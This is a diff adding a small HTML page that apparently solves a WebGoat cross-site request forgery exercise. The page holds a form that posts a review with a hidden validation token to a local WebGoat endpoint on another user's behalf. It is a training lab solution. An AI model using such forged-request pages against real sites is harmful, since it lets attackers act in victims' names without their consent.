@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>4.Post a review on someone else’s behalf</title>
+</head>
+<body>
+    <h1>4.Post a review on someone else’s behalf</h1>
+    <form method="POST" action="http://localhost:8080/WebGoat/csrf/review">
+        <input type="text" name="reviewText" placeholder="Add a Review">
+        <input type="text" name="stars" placeholder="Add the star number">
+        <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+        <input type="submit" name="submit" value="Submit review">
+    </form>
+</body>
+</html>
